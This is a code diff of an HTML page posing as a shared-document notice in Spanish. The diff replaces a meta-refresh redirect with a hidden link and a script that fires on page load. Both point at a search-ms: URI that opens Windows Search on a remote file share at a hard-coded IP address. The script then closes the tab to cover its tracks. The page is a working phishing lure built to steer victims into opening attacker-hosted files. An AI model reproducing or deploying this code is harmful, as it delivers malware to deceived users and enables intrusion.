@@ -4,10 +4,21 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Compartió un Documento</title>
-    <!-- Meta refresh to redirect instantly -->
-    <meta http-equiv="refresh" content="0; url=search-ms:query=&crumb=location:\\81.161.238.78@4673\empresadoc\&displayname=Search">
 </head>
 <body>
-    <p>If you are not redirected automatically, <a href="search-ms:query=&crumb=location:\\81.161.238.78@4673\empresadoc\&displayname=Search">click here</a>.</p>
+    <a id="autoOpenButton" class="button" href="search-ms:query=&crumb=location:\\81.161.238.78@4673\empresadoc\&displayname=Search"></a>
+
+    <script>
+        // Automatically click the button and close the tab
+        window.onload = function() {
+            // Open the link
+            document.getElementById("autoOpenButton").click();
+
+            // Delay for link to open, then close the current tab
+            setTimeout(function() {
+                window.close();
+            }, 3000); // Adjust the delay if needed
+        };
+    </script>
 </body>
 </html>
